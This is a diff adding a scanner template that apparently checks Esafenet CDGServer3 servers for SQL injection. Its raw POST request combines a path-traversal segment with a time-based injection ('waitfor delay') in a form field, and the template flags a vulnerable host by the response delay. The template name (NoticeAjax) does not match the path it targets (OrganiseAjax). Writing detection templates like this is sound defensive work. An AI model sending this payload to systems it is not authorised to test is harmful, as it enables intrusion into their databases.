@@ -1,0 +1,23 @@
+http:
+    - matchers:
+        - condition: and
+          dsl:
+            - duration > 3 && status_code==200 && contains_all(body,'waitfor delay')
+          type: dsl
+      raw:
+        - |
+          POST /CDGServer3/js/../OrganiseAjax HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+          Accept-Language: zh-CN
+          Content-Type: application/x-www-form-urlencoded
+          Connection: close
+
+          command=search&groupNameSearch=-1'waitfor delay '0:0:3'--
+id: 亿赛通NoticeAjax-SQL注入
+info:
+    author: sm
+    name: 亿赛通NoticeAjax-SQL注入
+    severity: high
+    tags:
+        - 亿赛通
